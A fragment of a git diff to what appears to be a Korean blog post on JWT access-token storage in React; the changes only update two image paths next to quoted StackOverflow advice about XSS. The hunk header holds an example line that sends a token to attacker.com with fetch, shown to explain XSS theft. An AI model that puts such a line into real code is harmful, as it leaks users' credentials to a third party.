@@ -92,13 +92,13 @@ fetch("https://attacker.com/steal?token=" + token);
 
 다음은 StackOverFlow의 관련 질문 답변 내용이다.
 
-![StackOverflow - 클라이언트 저장 장소는 상관없다](/assets/React/stackoverflow-jwt-clientside.png)
+![StackOverflow - 클라이언트 저장 장소는 상관없다](/assets/React/jwt-access-token/stackoverflow-jwt-clientside.png)
 
 > 클라이언트 측에 저장만 한다면 장소는 상관없다. XSS 공격으로 악성 코드가 침투된다면 안전한 곳은 거기서 거기기 때문이다. 유저가 저장 내용을 서로 주고받게만 못하게 하고 다른 보안 방법을 더 찾아봐라.
 
 <br/>
 
-![StackOverflow - Redux에 저장해도 되는가](/assets/React/stackoverflow-jwt-redux.png)
+![StackOverflow - Redux에 저장해도 되는가](/assets/React/jwt-access-token/stackoverflow-jwt-redux.png)
 
 Redux에 저장해도 된다. 그러나 다음 사항을 생각해봐라.
 
